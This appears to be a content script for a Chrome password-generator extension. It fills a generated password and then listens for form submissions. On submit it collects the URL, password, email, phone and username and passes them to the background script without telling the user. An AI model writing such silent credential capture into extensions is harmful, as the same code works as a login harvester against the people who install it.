// Content script for the Password Generator extension

// Listen for messages from the background script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "fillPassword") {
    // Fill the password in the active element (password field)
    fillPasswordField(message.password);
    
    // Show a notification to the user
    showNotification("Password generated and filled in the field.");
    
    // Start monitoring for form submission
    monitorFormSubmission();
  }
  return true;
});

// Fill the password in the currently focused input field
function fillPasswordField(password) {
  const activeElement = document.activeElement;
  
  if (activeElement && (activeElement.tagName === "INPUT" || activeElement.isContentEditable)) {
    // If it's an input field
    if (activeElement.tagName === "INPUT") {
      activeElement.value = password;
      
      // Trigger input event to notify the page that the field was filled
      const event = new Event('input', { bubbles: true });
      activeElement.dispatchEvent(event);
      
      // Also trigger change event
      const changeEvent = new Event('change', { bubbles: true });
      activeElement.dispatchEvent(changeEvent);
    } 
    // If it's a contentEditable element
    else if (activeElement.isContentEditable) {
      activeElement.textContent = password;
    }
  }
}

// Show a notification to the user
function showNotification(message) {
  const notification = document.createElement('div');
  notification.textContent = message;
  notification.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    background-color: #4CAF50;
    color: white;
    padding: 16px;
    border-radius: 4px;
    z-index: 9999;
    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
  `;
  document.body.appendChild(notification);
  
  // Remove notification after 3 seconds
  setTimeout(() => {
    document.body.removeChild(notification);
  }, 3000);
}

// Monitor form submission to capture username/email/phone
function monitorFormSubmission() {
  // Find the form that contains the password field
  const form = document.activeElement.form;
  
  if (form) {
    // Listen for form submission
    form.addEventListener('submit', captureCredentials);
  }
  
  // Also add event listeners to submit buttons as a fallback
  const submitButtons = document.querySelectorAll('button[type="submit"], input[type="submit"]');
  submitButtons.forEach(button => {
    button.addEventListener('click', captureCredentials);
  });
}

// Capture credentials when form is submitted
function captureCredentials(event) {
  // Find potential username/email/phone fields
  const form = event.target.closest('form');
  
  if (!form) return;
  
  const inputs = form.querySelectorAll('input');
  let userData = {
    url: window.location.href,
    username: '',
    email: '',
    phone: '',
    password: ''
  };
  
  // Check each input field
  inputs.forEach(input => {
    const type = input.type.toLowerCase();
    const name = input.name.toLowerCase();
    const id = input.id.toLowerCase();
    const value = input.value;
    
    // Skip empty fields
    if (!value) return;
    
    // Detect field type based on attributes
    if (type === 'password') {
      userData.password = value;
    } else if (type === 'email' || name.includes('email') || id.includes('email')) {
      userData.email = value;
    } else if (type === 'tel' || name.includes('phone') || id.includes('phone') || name.includes('mobile') || id.includes('mobile')) {
      userData.phone = value;
    } else if (name.includes('user') || id.includes('user') || name.includes('login') || id.includes('login')) {
      userData.username = value;
    }
  });
  
  // Send the captured data to the background script
  chrome.runtime.sendMessage({
    action: "saveCredentials",
    data: userData
  });
}
